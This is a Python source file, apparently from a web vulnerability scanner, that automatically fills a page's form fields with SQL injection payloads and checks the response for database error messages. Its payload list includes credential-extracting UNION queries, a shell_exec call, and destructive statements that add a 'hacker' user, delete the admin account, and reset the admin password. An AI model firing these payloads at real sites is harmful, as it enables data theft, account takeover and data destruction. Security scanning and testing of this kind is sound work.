from csv import field_size_limit
from doctest import UnexpectedException
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
import gevent
import traceback
from driver import getDriver
class SQL_Scanner():
    def __init__(self, page,app) -> None:
        try :
            self.payloads = ["'admin' OR '1'='1'","' or 1=1 --","'admin' /!50000UnIoN/ /!50000SeLeCt/ 1,2,3,4,5,6,7,8,9,10,username,12,13,14,password,16,17,18,19,20,21,22,23,24,25/!50000FrOm/ users--","'admin' IF(SUBSTR(@@version,1,1)='5',BENCHMARK(2000000,SHA1(1)),null)--","'admin' AND (SELECT ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))=97)--","'admin'; WAITFOR DELAY '0:0:1'--"," ;SELECT shell_exec('ls')--","');INSERT INTO users (username, password) VALUES ('hacker', '1234');--","');DELETE FROM users WHERE username='admin';--","');UPDATE users SET password=md5('password') WHERE username='admin';--","' OR 1=1%0D%0A"]
            self.errorSintax=["SQL syntax error","mysql_fetch","syntax error","error in your SQL syntax","supplied argument is not a valid MySQL result resource","or die(you have an error in your SQL syntax","mysql_num_rows()","mysql_fetch_assoc()","mysql_fetch_array()","mysql_fetch_row()","pg_query()","pg_send_query()","pg_get_result()"]
            self.threadsEnCours = False
            self.page =page
            self.threads = []
            self.vulnFound=None
            #self.vitesse = app.getSpeedScan()
            self.vitesse = 4

            self.startScan(app)
        except :
            app.webScanner.error.append("Due to a serious error the search SQL could not be executed. Please contact support."+traceback.format_exc())
            return

    def getVulnFound(self):
        return self.vulnFound

    def startScan(self,app):
        try :
            if self.vitesse == 1:
                sous_liste = [self.payloads]
            else:
                taille_sous_liste = len(self.payloads) // self.vitesse
                reste = len(self.payloads) % self.vitesse
                sous_liste = []
                debut = 0
                for i in range(self.vitesse):
                    fin = debut + taille_sous_liste
                    if i < reste:
                        fin += 1 
                    sous_liste.append(self.payloads[debut:fin])
                    debut = fin
        except:
            app.webScanner.error.append("Critical error cuttting payloads SQL"+traceback.format_exc())
            return
  
        groupesPayload=[]
        for groupe in sous_liste:
            if not(groupe == [] or groupe == None or groupe == "" or groupe == [ ]):
                groupesPayload.append(groupe)
                
        self.threadsEnCours = True
        try:
            threads = [gevent.spawn(self.check_sql_form, self.page, groupesPayload[i],app) for i in range(len(groupesPayload))]
            gevent.joinall(threads)
        except:
            app.webScanner.error.append("Critical error multi threading !!! Please contact support."+traceback.format_exc())
            print("ending sql scan")


    def check_sql_form(self,page=None, payloads=[],app=None):
        try : 
            driver = getDriver(app)
            if driver == None : 
                app.webScanner.error.append("The browser driver does not exist. SQL analysis failed. Please check your software settings and or configurations.")    
                return
            for payload in payloads:  
                if self.threadsEnCours :
                    try : 
                        driver.get(page)
                        WebDriverWait(driver, 10).until(lambda driver: driver.execute_script('return document.readyState') == 'complete')
                    except : 
                        app.webScanner.error.append("SQL parsing error :"+traceback.format_exc())
                             
                    try : 
                        fields = driver.find_elements(By.XPATH, "//input | //textarea")
                    except:
                        driver.quit() 
                        return
                    for field in fields:
                        try : 
                            if field.is_displayed():
                                field.send_keys(str(payload))
                        except :
                            driver.quit()
                            return
 
                    try :
                        submit_button = driver.find_element(By.XPATH, "//input[@type='submit']")
                        submit_button.click()
                    except :
                        return
                    WebDriverWait(driver, 0.2)
                    codePage = driver.page_source
                    for error in self.errorSintax:
                        if error in codePage:
                            print("SQL detected with : ",  payload)
                            self.vulnFound="⚠ Possible SQL injection vulnerability on :" + str(page) + " with : "+str(payload)
                            driver.quit()
                            return

                    print("SQL payload failed : ", payload)
                else :
                    driver.quit()
                    return
            driver.quit()
            return
        except :
            app.webScanner.error.append("Error SQL analysis : "+traceback.format_exc())
            driver.quit()
            return
            


